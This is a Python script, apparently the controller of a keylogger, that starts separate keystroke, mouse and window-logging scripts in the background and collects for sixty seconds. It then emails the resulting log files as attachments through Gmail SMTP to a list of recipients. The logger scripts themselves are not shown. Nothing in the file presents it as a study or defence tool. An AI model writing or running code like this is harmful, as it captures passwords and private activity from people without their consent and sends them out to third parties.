import subprocess
import os
import time
import sys
import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase

smtpport = 587
smtpserver = "smtp.gmail.com"
klogger = "keylistener.py"
mlogger = "mouselistener.py"
winlogger = "windowlogger.py"
email_from = "USER_EMAIL"
email_list = ["USER1", "USER2", "USER3"]
passwd = "USER_PASSWORD"
subject = "Python Activity Logger"

def send_emails(email_list):
    log_files = ["keylogs.txt", "mouselogs.txt", "winlogs.txt"]
    
    for person in email_list:
        body = f"Updated logs attached."
        msg = MIMEMultipart()
        msg['From'] = email_from
        msg['To'] = person
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        for filename in log_files:
            if os.path.exists(filename):
                try:
                    with open(filename, 'rb') as attachment:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(attachment.read())
                        encoders.encode_base64(part)
                        part.add_header(
                            'Content-Disposition', 
                            f"attachment; filename= {filename}"
                        )
                        msg.attach(part)
                except Exception as e:
                    print(f"Error attaching {filename}: {e}")

        try:
            text = msg.as_string()
            TIE_server = smtplib.SMTP(smtpserver, smtpport)
            TIE_server.starttls()
            TIE_server.login(email_from, passwd)
            TIE_server.sendmail(email_from, person, text)
            TIE_server.quit()
            print(f"Email sent to {person}")
        except Exception as e:
            print(f"Failed to send email to {person}: {e}")

if __name__ == "__main__":
    if not os.path.exists(klogger) or not os.path.exists(mlogger) or not os.path.exists(winlogger):
        print("Listener and logger files not found.")
    else:
        processes = []
        try:
            print("Starting loggers...")
            p1 = subprocess.Popen([sys.executable, klogger])
            processes.append(p1)
            
            p2 = subprocess.Popen([sys.executable, mlogger])
            processes.append(p2)
            
            p3 = subprocess.Popen([sys.executable, winlogger])
            processes.append(p3)

            collecttime = 60
            print(f"Collecting data for {collecttime} seconds...")
            time.sleep(collecttime)
            
            print("Sending logs...")
            send_emails(email_list)

        except KeyboardInterrupt:
            print("\nStopping manually...")
        finally:
            print("Terminating background processes...")
            for p in processes:
                p.terminate()
            print("Logging finished.")